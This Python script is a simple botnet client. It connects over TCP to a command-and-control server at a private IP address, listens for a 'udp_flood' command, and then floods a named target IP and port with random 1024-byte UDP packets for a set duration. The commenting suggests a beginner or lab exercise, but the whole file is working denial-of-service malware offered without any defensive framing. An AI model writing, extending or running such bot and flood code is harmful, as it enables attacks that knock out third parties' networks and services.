import socket
import random
import time


# Function to execute a UDP flood attack
def udp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration  # Calculate the attack end time
    print(f"Starting UDP flood on {target_ip}:{target_port} for {duration} seconds. >;)")

    # Create a UDP socket for sending datagrams(the actual data), no connection needed! using IPv4 and UDP protocol.
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = random._urandom(1024)  # random 1024-byte payload the data we're sending.

    packet_count = 0  # Counter for the number of packets sent
    while time.time() < timeout:  # Run until the specified duration expires
        try:
            udp_socket.sendto(message, (target_ip, target_port))  # Sends the message to the target_ip and target_port.
            packet_count += 1  # Increment the packet count

            # Log every 100,000 packets sent to provide feedback during flood
            if packet_count % 100000 == 0:
                print(f"Packets sent: {packet_count}")
        except Exception as e:
            print(f"Error: {e}")  # Handle any errors during packet sending

    print(f"UDP flood finished. Total amount of packets sent: {packet_count}")


# Manage connection to the command control server.
def bot():  # Actice socket (Active endpoint)
    server_ip = "192.168.1.136"  # IP address of the control server
    server_port = 54321  # Port number of the control server

    while True:
        try:
            print(f"Connecting to server at {server_ip}:{server_port}")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket using IPv4 and TCP.
            s.connect((server_ip, server_port))  # Connect to the server

            while True:
                # Receive a command from the server and decodes it.
                command = s.recv(1024).decode()
                print(f"Command to be executed the from server: {command}")

                # Exit if the server sends the "exit" command
                if command.lower() == "exit":
                    print("Terminating bot.")
                    break

                # Handle UDP flood command logic
                if command.startswith("udp_flood"):
                    # Parse the command arguments i.e ("udp_flood <ip> <port> <duration>")
                    _, target_ip, target_port, duration = command.split()
                    # ignore udp_flood var, we only want the target ip and port for sending data.
                    udp_flood(target_ip, int(target_port), int(duration))  # Execute UDP flood method.
                else:
                    break
                    # we only have 1 command right now.

            s.close()  # Terminate the TCP socket when exiting
            break
        except Exception as e:
            print(f"ERROR!: {e}")  # Handle any errors during connection or execution
            break


# Entry point for the bot script
if __name__ == "__main__":
    bot()